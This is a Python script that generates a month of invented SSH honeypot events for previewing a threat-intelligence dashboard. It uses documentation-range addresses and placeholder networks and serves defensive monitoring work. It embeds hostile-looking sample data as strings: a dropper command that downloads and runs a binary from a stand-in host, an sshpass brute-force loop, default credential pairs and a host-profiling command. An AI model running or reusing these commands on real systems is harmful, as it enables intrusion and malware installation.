#!/usr/bin/env python3
"""Build a synthetic database for previewing the dashboard without a sensor.

    python tools/demo_data.py /tmp/radar-demo
    TR_DB=/tmp/radar-demo/radar.db TR_SAMPLE_DIR=/tmp/radar-demo/samples \\
        uvicorn app.main:app --port 8080

Design work needs realistic shapes: a funnel that narrows by orders of
magnitude, a map with points on several continents, a month of daily volume
with a surge in it. The test fixtures are tiny and hostile, so
they make every page look broken. This script makes a month of plausible
traffic instead.

Everything here is invented. Addresses come from the RFC 5737 documentation
ranges, AS numbers from the RFC 5398 documentation block, and organisation
names are placeholders, so a screenshot taken from this data can be shared
without exposing a real sensor or accusing a real network. Locations are
country capitals. The same seed always produces the same database.
"""

import datetime as dt
import hashlib
import importlib.util
import json
import os
import random
import sqlite3
import sys

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

# (country, code, city, lat, lon, documentation ASN, placeholder operator)
NETWORKS = [
    ("Netherlands", "NL", "Amsterdam", 52.37, 4.90, 64496, "Example Hosting B.V."),
    ("Germany", "DE", "Berlin", 52.52, 13.40, 64497, "Demo Cloud GmbH"),
    ("United States", "US", "Ashburn", 39.04, -77.49, 64498, "Sample Compute LLC"),
    ("China", "CN", "Beijing", 39.90, 116.40, 64499, "Placeholder Telecom"),
    ("Brazil", "BR", "Sao Paulo", -23.55, -46.63, 64500, "Exemplo Internet Ltda"),
    ("Vietnam", "VN", "Hanoi", 21.03, 105.85, 64501, "Mau Network JSC"),
    ("India", "IN", "Mumbai", 19.08, 72.88, 64502, "Specimen Broadband"),
    ("Russia", "RU", "Moscow", 55.76, 37.62, 64503, "Obrazets Hosting"),
    ("South Korea", "KR", "Seoul", 37.57, 126.98, 64504, "Yesi Data Center"),
    ("Singapore", "SG", "Singapore", 1.35, 103.82, 64505, "Sample Edge Pte"),
    ("France", "FR", "Paris", 48.86, 2.35, 64506, "Exemple Serveurs SAS"),
    ("United Kingdom", "GB", "London", 51.51, -0.13, 64507, "Illustrative Hosting Ltd"),
    ("Iran", "IR", "Tehran", 35.69, 51.39, 64508, "Nemuneh Net"),
    ("Indonesia", "ID", "Jakarta", -6.21, 106.85, 64509, "Contoh Akses"),
    ("Romania", "RO", "Bucharest", 44.43, 26.10, 64510, "Exemplu Data SRL"),
    ("South Africa", "ZA", "Johannesburg", -26.20, 28.05, 64511, "Voorbeeld Online"),
]
# A few networks carry most of the traffic, which is what real sensors see.
WEIGHTS = [30, 18, 14, 10, 6, 5, 4, 4, 3, 2, 2, 2, 1, 1, 1, 1]

CREDENTIALS = [
    ("root", "123456"), ("root", "root"), ("admin", "admin"), ("ubuntu", "ubuntu"),
    ("root", "password"), ("user", "user"), ("test", "test"), ("oracle", "oracle"),
    ("postgres", "postgres"), ("git", "git"), ("solana", "solana"), ("sol", "validator"),
    ("ftpuser", "ftpuser"), ("deploy", "deploy123"), ("pi", "raspberry"), ("root", "qwerty"),
    ("jenkins", "jenkins"), ("hadoop", "hadoop"), ("admin", "1q2w3e4r"), ("backup", "backup"),
]
# Pairs the decoy accepts, so some guesses succeed.
ACCEPTED = {("ubuntu", "ubuntu"), ("test", "test"), ("user", "user"), ("deploy", "deploy123")}

PROFILE_CMD = ("uname -a; cat /proc/cpuinfo | grep name | head -1; nproc; "
               "lspci | grep -i vga; uptime; last | head -3")
DROPPER = ("cd /tmp || cd /var/run || cd /dev/shm; wget http://203.0.113.50/bins/x86 -O .x; "
           "chmod +x .x; ./.x ssh.scan")

TEXT_SAMPLES = [
    b"#!/bin/sh\ncd /tmp\nwget http://203.0.113.50/bins/x86 -O .x\nchmod +x .x\n./.x\n"
    + b"# demo dropper, not a real payload\n" * 4,
    b"#!/bin/bash\nfor h in $(cat targets.txt); do\n  sshpass -p \"$P\" ssh -o StrictHostKeyChecking=no root@$h 'id'\ndone\n"
    + b"# demo scanner, not a real payload\n" * 4,
]


def load_worker():
    spec = importlib.util.spec_from_file_location(
        "intel_worker", os.path.join(ROOT, "bin", "intel_worker.py"))
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def main(out_dir):
    os.makedirs(out_dir, exist_ok=True)
    db_path = os.path.join(out_dir, "radar.db")
    sample_dir = os.path.join(out_dir, "samples")
    os.makedirs(sample_dir, exist_ok=True)
    if os.path.exists(db_path):
        os.remove(db_path)

    os.environ.update({"TR_APP": ROOT, "TR_BASE": ROOT, "TR_DB": db_path,
                       "TR_SAMPLE_DIR": sample_dir, "TR_VT_API_KEY": "", "TR_URLHAUS_AUTH_KEY": ""})
    sys.path.insert(0, ROOT)
    from app.analytics import db
    worker = load_worker()

    def no_network(*_a, **_k):
        raise RuntimeError("demo data never touches the network")
    worker._http = no_network
    worker.log = lambda *_: None

    con = sqlite3.connect(db_path)
    with open(os.path.join(ROOT, "schema.sql"), encoding="utf-8") as fh:
        con.executescript(fh.read())
    con.close()
    con = db.connect_rw(db_path)
    worker.ensure_schema(con)

    rng = random.Random(1729)
    now = dt.datetime.now(dt.timezone.utc).replace(microsecond=0)

    shas = []
    for body in TEXT_SAMPLES:
        sha = hashlib.sha256(body).hexdigest()
        with open(os.path.join(sample_dir, sha), "wb") as fh:
            fh.write(body)
        shas.append(sha)

    pool = ["192.0.2.%d" % i for i in range(1, 255)] + \
           ["198.51.100.%d" % i for i in range(1, 255)] + \
           ["203.0.113.%d" % i for i in range(60, 255)]
    rng.shuffle(pool)
    sources = pool[:420]

    n = 0
    def event(eventid, session, src, when, **fields):
        nonlocal n
        n += 1
        ts = when.strftime("%Y-%m-%dT%H:%M:%S.%fZ")
        body = dict(fields, eventid=eventid, session=session, src_ip=src, timestamp=ts)
        line = json.dumps(body)
        con.execute(
            "INSERT OR IGNORE INTO raw_events(line_hash,eventid,session,src_ip,ts,payload)"
            " VALUES(?,?,?,?,?,?)",
            (hashlib.sha256(f"{line}{n}".encode()).hexdigest(), eventid, session, src, ts, line))

    session_n = 0
    for src in sources:
        net = rng.choices(NETWORKS, weights=WEIGHTS)[0]
        country, code, city, lat, lon, asn, org = net
        con.execute(
            "INSERT OR REPLACE INTO sources(ip, country, country_code, city, lat, lon, asn, as_org,"
            " enriched_at) VALUES(?,?,?,?,?,?,?,?,?)",
            (src, country, code, city, lat + rng.uniform(-2, 2), lon + rng.uniform(-2, 2),
             asn, org, now.isoformat()))

        # How far this source will get: most never log in.
        depth = rng.choices([0, 1, 2, 3], weights=[70, 18, 9, 3])[0]
        sessions = rng.randint(2, 40) if depth == 0 else rng.randint(1, 8)
        # One network surges for three days in the middle of the month.
        surge = asn == 64497 and rng.random() < .5
        for _ in range(sessions):
            session_n += 1
            sid = "%012x" % (0xd3e000000000 + session_n)
            back = rng.uniform(13.0, 16.0) if surge else rng.uniform(0.1, 29.5)
            t = now - dt.timedelta(days=back, minutes=rng.randint(0, 600))
            event("cowrie.session.connect", sid, src, t, src_port=rng.randint(30000, 65000),
                  dst_ip="192.0.2.1", dst_port=22)
            event("cowrie.client.version", sid, src, t,
                  version=rng.choice(["SSH-2.0-Go", "SSH-2.0-libssh_0.9.6", "SSH-2.0-PuTTY_Release_0.80"]))
            event("cowrie.client.kex", sid, src, t,
                  hassh=rng.choice(["16443846184eafde36765c9bab2f4397", "f555226df1963d1d3c09daf865abdc9a",
                                    "0a07365cc01fa9fc82608ba4019af499"]))
            t += dt.timedelta(seconds=2)
            for _ in range(rng.randint(1, 4)):
                user, pw = rng.choice(CREDENTIALS)
                ok = depth >= 1 and (user, pw) in ACCEPTED
                event("cowrie.login.success" if ok else "cowrie.login.failed", sid, src, t,
                      username=user, password=pw)
                t += dt.timedelta(seconds=1)
            if depth >= 1:
                user, pw = rng.choice(sorted(ACCEPTED))
                event("cowrie.login.success", sid, src, t, username=user, password=pw)
                t += dt.timedelta(seconds=1)
            if depth >= 2:
                event("cowrie.command.input", sid, src, t, input=PROFILE_CMD)
                t += dt.timedelta(seconds=3)
                if rng.random() < .2:
                    event("cowrie.direct-tcpip.request", sid, src, t, dst_ip="198.51.100.200",
                          dst_port=rng.choice([25, 80, 443, 3333]), src_port=5555)
            if depth >= 3:
                event("cowrie.command.input", sid, src, t, input=DROPPER)
                t += dt.timedelta(seconds=2)
                event("cowrie.session.file_download", sid, src, t, shasum=rng.choice(shas),
                      url="http://203.0.113.50/bins/x86", destfile="/tmp/.x",
                      outfile="var/lib/cowrie/downloads/x")
            t += dt.timedelta(seconds=rng.uniform(1, 20))
            event("cowrie.session.closed", sid, src, t, duration=round(rng.uniform(1, 40), 1))
    con.commit()

    for stage in (worker.build_facts, worker.build_sessions, worker.build_tunnels,
                  worker.build_payloads, worker.build_entities, worker.build_credentials):
        stage(con, True)
    worker.fpmod.rebuild(con, True, 30)
    worker.escmod.rebuild(con)
    worker.escmod.rebuild_daily(con, True, 30)
    worker.spikemod.annotate(con, force=True)
    con.commit()
    con.close()
    print(f"{n} events from {len(sources)} sources written to {db_path}")


if __name__ == "__main__":
    main(sys.argv[1] if len(sys.argv) > 1 else "/tmp/radar-demo")
